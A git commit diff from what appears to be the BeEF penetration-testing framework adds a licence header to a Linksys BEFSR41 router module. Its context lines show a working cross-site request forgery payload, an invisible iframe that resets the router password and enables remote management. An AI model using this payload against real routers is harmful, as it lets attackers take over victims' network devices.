5c3e6f1575cce6d68026610d20ce8c7b52e20d95
scotty.b.brown@gmail.com <scotty.b.brown@gmail.com@b87d56ec-f9c0-11de-8c8a-61c5e9addfc9>
2011-07-02 23:08:28 +0000

    Adding Apache Licence Header to all files (except VERSION file)
    git-svn-id: https://beef.googlecode.com/svn/trunk@1046 b87d56ec-f9c0-11de-8c8a-61c5e9addfc9

--- modules/network/linksys_befsr41_csrf/command.js
+++ modules/network/linksys_befsr41_csrf/command.js
@@ -1,3 +1,18 @@
+//
+//   Copyright 2011 Wade Alcorn wade@bindshell.net
+//
+//   Licensed under the Apache License, Version 2.0 (the "License");
+//   you may not use this file except in compliance with the License.
+//   You may obtain a copy of the License at
+//
+//       http://www.apache.org/licenses/LICENSE-2.0
+//
+//   Unless required by applicable law or agreed to in writing, software
+//   distributed under the License is distributed on an "AS IS" BASIS,
+//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+//   See the License for the specific language governing permissions and
+//   limitations under the License.
+//
 beef.execute(function() {
   var iframe = beef.dom.createInvisibleIframe();
   iframe.setAttribute('src', '<%= @base %>Gozila.cgi?PasswdModify=1&sysPasswd=<%= @password %>&sysPasswdConfirm=<%= @password %>&Remote_Upgrade=1&Remote_Management=1&RemotePort=<%= @port %>&UPnP_Work=0');
